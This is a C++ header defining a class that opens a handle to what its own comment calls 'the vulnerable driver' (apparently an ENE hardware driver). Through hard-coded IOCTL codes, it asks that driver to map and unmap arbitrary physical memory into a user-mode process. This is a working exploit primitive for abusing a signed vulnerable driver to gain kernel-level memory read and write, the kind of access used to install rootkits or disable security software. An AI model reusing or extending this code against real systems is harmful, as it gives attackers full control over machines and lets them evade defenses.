#pragma once

#include <string>
#include <sstream>
#include <map>

#include "AutoHandle.h"
#include "DebugLog.h"

constexpr ULONG IOCTL_MAP_PHYSICAL_MEMORY = 0x80102040;
constexpr ULONG IOCTL_UNMAP_PHYSICAL_MEMORY = 0x80102044;

/*
	Interfaces with the vulnerable driver
*/
class EneDriver {
private:
	Utils::AutoHandle driverHandle;

	/*
		Meatadata relating to physical memory mapping
	*/
	typedef struct {
		HANDLE SectionHandle;
		PVOID SectionObject;
	} PhysicalMemoryMapping;

	std::map<PVOID, PhysicalMemoryMapping> map;


	/*
		Parameters for driver IOCTL_MAP_PHYSICAL_MEMORY and IOCTL_UNMAP_PHYSICAL_MEMORY
	*/
	typedef struct {
		// Size of memory block to map
		ULONG BufferSize;

		// Base of physical memory buffer
		ULONG_PTR PhysicalAddress;

		// Handle to created section object
		HANDLE SectionHandle;

		// Virtual Base Address of mapped physical memory buffer
		PVOID VirtualBaseAddress;

		// Address of section object
		PVOID SectionObject;
	} MapPhysicalMemoryParameters;

public:
	EneDriver(const std::string& DriverPath) : driverHandle(), map() {
		auto handle = ::CreateFileA(DriverPath.c_str(), GENERIC_READ | GENERIC_WRITE,
			0, nullptr, OPEN_EXISTING, 0, nullptr);
		if (handle == 0 || handle == INVALID_HANDLE_VALUE) {
			std::stringstream sstream;
			sstream << "Failed to find the driver object at " << DriverPath << "\n";
			throw std::runtime_error(sstream.str());
		} 
		driverHandle.set(handle);
	}

	PVOID MapPhysicalMemory(_In_ ULONG BufferSize, _In_ ULONG_PTR PhysicalAddress) {
		MapPhysicalMemoryParameters params = { 0 };
		params.PhysicalAddress = PhysicalAddress;
		params.BufferSize = BufferSize;
		auto status = ::DeviceIoControl(this->driverHandle.get(), IOCTL_MAP_PHYSICAL_MEMORY,
			&params, sizeof(MapPhysicalMemoryParameters), &params, sizeof(MapPhysicalMemoryParameters), nullptr, nullptr);
		if (!status) {
			LOGGER.error("Failed to call ioctl ", std::hex, "0x", IOCTL_MAP_PHYSICAL_MEMORY);
			return nullptr;
		}
		this->map[params.VirtualBaseAddress] = { params.SectionHandle, params.SectionObject };
		return params.VirtualBaseAddress;
	}

	VOID UnmapPhysicalMemory(_In_ PVOID SectionBase) {
		auto sectionIt = this->map.find(SectionBase);
		if (sectionIt == this->map.end()) {
			// nlah error
			LOGGER.error("Couldn't find section data matching base address 0x", std::hex, SectionBase);
			throw std::runtime_error("Failed to find matching section");
		}
		auto sectionData = (*sectionIt).second;
		MapPhysicalMemoryParameters params = { 0 };
		params.VirtualBaseAddress = SectionBase;
		params.SectionHandle = sectionData.SectionHandle;
		params.SectionObject = sectionData.SectionObject;
		
		auto status = ::DeviceIoControl(this->driverHandle.get(), IOCTL_UNMAP_PHYSICAL_MEMORY,
			&params, sizeof(MapPhysicalMemoryParameters), &params, sizeof(MapPhysicalMemoryParameters), nullptr, nullptr);
		if (!status) {
			LOGGER.error("Couldn't unmap section");
			throw std::runtime_error("Couldn't unmap section"); // debug
		}
	}
};